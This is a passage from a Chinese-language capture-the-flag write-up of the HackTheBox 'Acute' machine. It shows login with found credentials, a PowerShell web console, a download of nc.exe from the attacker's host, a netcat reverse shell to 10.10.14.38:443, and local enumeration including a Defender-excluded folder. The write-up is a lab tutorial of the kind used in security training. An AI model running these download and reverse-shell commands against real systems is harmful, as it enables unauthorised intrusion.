+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Acute-PC01<br><br>EDavies<br><br>Password1!<br></code></pre></td></tr></table></figure>
+
+<p>14、登录进入后，发现是一个powershell的命令行界面，可以输入一些命令</p>
+<p><code>https://atsserver.acute.local/Acute_Staff_Access/en-US/console.aspx</code></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>15、尝试是否可以反向通外网我的主机</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\edavies\Documents&gt; <br><br>ping <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> -w <span class="hljs-number">4</span><br><br>Pinging <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> with <span class="hljs-number">32</span> bytes of data:<br><br>Reply from <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">258</span>ms TTL=<span class="hljs-number">62</span><br><br>Reply from <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">255</span>ms TTL=<span class="hljs-number">62</span><br><br>Reply from <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">257</span>ms TTL=<span class="hljs-number">62</span><br><br>Reply from <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">255</span>ms TTL=<span class="hljs-number">62</span><br><br>Ping statistics <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>:<br><br>    Packets: Sent = <span class="hljs-number">4</span>, Received = <span class="hljs-number">4</span>, Lost = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),<br><br>Approximate round trip times in milli-seconds:<br><br>    Minimum = <span class="hljs-number">255</span>ms, Maximum = <span class="hljs-number">258</span>ms, Average = <span class="hljs-number">256</span>ms<br><br>PS C:\Users\edavies\Documents&gt; <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo tcpdump -i tun0 icmp<br>[sudo] kali 的密码：<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34.068118</span> IP atsserver.acute.local &gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: ICMP echo request, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">1</span>, length <span class="hljs-number">40</span><br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34.068188</span> IP <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> &gt; atsserver.acute.local: ICMP echo reply, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">1</span>, length <span class="hljs-number">40</span><br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34.975338</span> IP atsserver.acute.local &gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: ICMP echo request, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">2</span>, length <span class="hljs-number">40</span><br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34.975377</span> IP <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> &gt; atsserver.acute.local: ICMP echo reply, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">2</span>, length <span class="hljs-number">40</span><br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">35.876647</span> IP atsserver.acute.local &gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: ICMP echo request, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">3</span>, length <span class="hljs-number">40</span><br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">35.876686</span> IP <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> &gt; atsserver.acute.local: ICMP echo reply, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">3</span>, length <span class="hljs-number">40</span><br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">36.789916</span> IP atsserver.acute.local &gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>: ICMP echo request, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">4</span>, length <span class="hljs-number">40</span><br><span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">36.789965</span> IP <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> &gt; atsserver.acute.local: ICMP echo reply, id <span class="hljs-number">1000</span>, seq <span class="hljs-number">4</span>, length <span class="hljs-number">40</span><br></code></pre></td></tr></table></figure>
+
+<p>16、反向的连通性也是通的，那就构造反弹shell吧，这里尝试了几个powershell的反弹shell，发现均是报错，那就再继续看看</p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>17、这里就开始上传一个nc进行nc的shell反弹了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\edavies\Documents&gt; <br>ls<br>PS C:\Users\edavies\Documents&gt; <br>iwr -uri http:<span class="hljs-comment">//10.10.14.38/nc.exe -o C:\Users\edavies\Documents\nc.exe</span><br>PS C:\Users\edavies\Documents&gt; <br>ls<br>    Directory: C:\Users\edavies\Documents<br><br>Mode                 LastWriteTime         Length Name                                                                 <br><br>----                 -------------         ------ ----                                                                 <br><br>-a----         <span class="hljs-number">2024</span>/<span class="hljs-number">4</span>/<span class="hljs-number">16</span>     <span class="hljs-number">15</span>:<span class="hljs-number">01</span>          <span class="hljs-number">68608</span> nc.exe <br>PS C:\Users\edavies\Documents&gt; <br><br>┌──(kali㉿offsec)-[~/Desktop/tools]<br>└─$ python3 -m http.server <span class="hljs-number">80</span>                                                    <br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span> - - [<span class="hljs-number">17</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">29</span>] <span class="hljs-string">&quot;GET /nc.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br>./nc.exe -e powershell <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> <span class="hljs-number">443</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span>] <span class="hljs-number">49835</span><br>Windows PowerShell<br>Copyright (C) Microsoft Corporation. All rights reserved.<br><br>Try the new cross-platform PowerShell https:<span class="hljs-comment">//aka.ms/pscore6</span><br><br>PS C:\Users\edavies\Documents&gt; whoami<br>whoami<br>acute\edavies<br>PS C:\Users\edavies\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>18、接下来就是常规的信息枚举了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\edavies\Documents&gt; net user<br>net user<br><br>User accounts <span class="hljs-keyword">for</span> \\<br><br>-------------------------------------------------------------------------------<br>Administrator            DefaultAccount           Guest                    <br>Natasha                  WDAGUtilityAccount       <br>The command completed with one or more errors.<br><br>PS C:\Users\edavies\Documents&gt; ls C:/Users<br>ls C:/Users<br><br><br>    Directory: C:\Users<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>d-----        <span class="hljs-number">21</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">13</span>:<span class="hljs-number">01</span>                administrator.ACUTE                                                  <br>d-----        <span class="hljs-number">22</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">01</span>:<span class="hljs-number">26</span>                edavies                                                              <br>d-----        <span class="hljs-number">21</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">22</span>:<span class="hljs-number">50</span>                jmorgan                                                              <br>d-----        <span class="hljs-number">19</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">09</span>:<span class="hljs-number">29</span>                Natasha                                                              <br>d-r---        <span class="hljs-number">18</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2020</span>     <span class="hljs-number">23</span>:<span class="hljs-number">43</span>                Public                                                               <br><br><br>PS C:\Users\edavies\Documents&gt; <br><br><br>PS C:\Users\edavies\Documents&gt; net user edavies<br>net user edavies<br>The user name could not be found.<br><br>More help is available by typing NET HELPMSG <span class="hljs-number">2221.</span><br><br>PS C:\Users\edavies\Documents&gt; net user jmorgan<br>net user jmorgan<br>The user name could not be found.<br><br>More help is available by typing NET HELPMSG <span class="hljs-number">2221.</span><br><br>PS C:\Users\edavies\Documents&gt; net user Natasha<br>net user Natasha<br>User name                    Natasha<br>Full Name                    <br>Comment                      <br>User<span class="hljs-number">&#x27;</span>s comment               <br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">21</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span> <span class="hljs-number">10</span>:<span class="hljs-number">23</span>:<span class="hljs-number">01</span><br>Password expires             Never<br>Password changeable          <span class="hljs-number">22</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span> <span class="hljs-number">10</span>:<span class="hljs-number">23</span>:<span class="hljs-number">01</span><br>Password required            No<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script                 <br>User profile                 <br>Home directory               <br>Last logon                   <span class="hljs-number">21</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">13</span><br><br>Logon hours allowed          All<br><br>Local Group Memberships      <br>Global Group memberships     *None                 <br>The command completed successfully.<br><br>PS C:\Users\edavies\Documents&gt; <br><br>通过这里，可能应该是需要横向到 Natasha 用户<br><br>PS C:\Users\edavies\Documents&gt; cd C:/<br>cd C:/<br>PS C:\&gt; ls<br>ls<br><br><br>    Directory: C:\<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>d-----        <span class="hljs-number">07</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2019</span>     <span class="hljs-number">09</span>:<span class="hljs-number">14</span>                PerfLogs                                                             <br>d-r---        <span class="hljs-number">06</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">11</span>:<span class="hljs-number">06</span>                Program Files                                                        <br>d-r---        <span class="hljs-number">07</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">12</span>:<span class="hljs-number">43</span>                Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>                                                  <br>d-r---        21/12/2021     22:50                Users                                                                <br>d-----        31/01/2022     00:29                Utils                                                                <br>d-----        16/12/2021     01:23                Windows                 <br>  <br>PS C:\&gt; cd Utils<br>cd Utils<br>PS C:\Utils&gt; ls<br>ls<br>PS C:\Utils&gt; ls -la<br>ls -la<br>Get-ChildItem : A parameter cannot be found that matches parameter name &#x27;la&#x27;.<br>At line:1 <span class="hljs-type">char</span>:4<br>+ ls -la<br>+    ~~~<br>    + CategoryInfo          : InvalidArgument: <span class="hljs-params">(:)</span> [Get-ChildItem], ParameterBindingException<br>    + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand<br> <br>PS C:\Utils&gt; dir -force<br>dir -force<br><br>    Directory: C:\Utils<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-a-h--        21/12/2021     18:41            148 desktop.ini <br><br>PS C:\Utils&gt; cat desktop.ini<br>cat desktop.ini<br>[.ShellClassInfo]<br>InfoTip=Directory <span class="hljs-keyword">for</span> Testing Files without Defender<br>PS C:\Utils&gt; <br><br>用于在没有Defender的情况下测试文件的目录<br><br>根据提示，可以知道这个目录不会被杀软给杀掉<br><br>PS C:\Utils&gt; net time /domain<br>net time /domain<br>The service has not been started.<br><br>More help is available by typing NET HELPMSG <span class="hljs-number">2184.</span><br><br>PS C:\Utils&gt; systeminfo<br>systeminfo<br>ERROR: Access denied<br>PS C:\Utils&gt;<br><br>看来当前用户的权限还是非常低的啊<br><br>PS C:\Utils&gt; netstat -ano<br>netstat -ano<br><br>Active Connections<br><br>  Proto  Local Address          Foreign Address        State           PID<br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">135</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">884</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">445</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5040</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">616</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5985</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">7680</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2004</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">47001</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49664</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">632</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49665</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">560</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49666</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">672</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49668</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">436</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49670</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">632</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49693</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">620</span><br>  TCP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">139</span>        <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">5985</span>       <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.1</span>:<span class="hljs-number">63119</span>      ESTABLISHED     <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">5985</span>       <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.1</span>:<span class="hljs-number">63160</span>      ESTABLISHED     <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">60223</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>:<span class="hljs-number">443</span>        ESTABLISHED     <span class="hljs-number">2768</span><br>  TCP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">60376</span>      <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.1</span>:<span class="hljs-number">5985</span>       TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    [::]:<span class="hljs-number">135</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">884</span><br>  TCP    [::]:<span class="hljs-number">445</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">5985</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">7680</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2004</span><br>  TCP    [::]:<span class="hljs-number">47001</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">49664</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">632</span><br>  TCP    [::]:<span class="hljs-number">49665</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">560</span><br>  TCP    [::]:<span class="hljs-number">49666</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">672</span><br>  TCP    [::]:<span class="hljs-number">49668</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">436</span><br>  TCP    [::]:<span class="hljs-number">49670</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">632</span><br>  TCP    [::]:<span class="hljs-number">49693</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">620</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">123</span>            *:*                                    <span class="hljs-number">956</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">500</span>            *:*                                    <span class="hljs-number">436</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">4500</span>           *:*                                    <span class="hljs-number">436</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5050</span>           *:*                                    <span class="hljs-number">616</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5353</span>           *:*                                    <span class="hljs-number">1132</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5353</span>           *:*                                    <span class="hljs-number">896</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5353</span>           *:*                                    <span class="hljs-number">896</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5355</span>           *:*                                    <span class="hljs-number">1132</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">50837</span>          *:*                                    <span class="hljs-number">1132</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1900</span>         *:*                                    <span class="hljs-number">4980</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">52794</span>        *:*                                    <span class="hljs-number">632</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">52863</span>        *:*                                    <span class="hljs-number">436</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">57074</span>        *:*                                    <span class="hljs-number">1456</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">58361</span>        *:*                                    <span class="hljs-number">4980</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">62516</span>        *:*                                    <span class="hljs-number">1132</span><br>  UDP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">137</span>        *:*                                    <span class="hljs-number">4</span><br>  UDP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">138</span>        *:*                                    <span class="hljs-number">4</span><br>  UDP    <span class="hljs-number">172.16</span><span 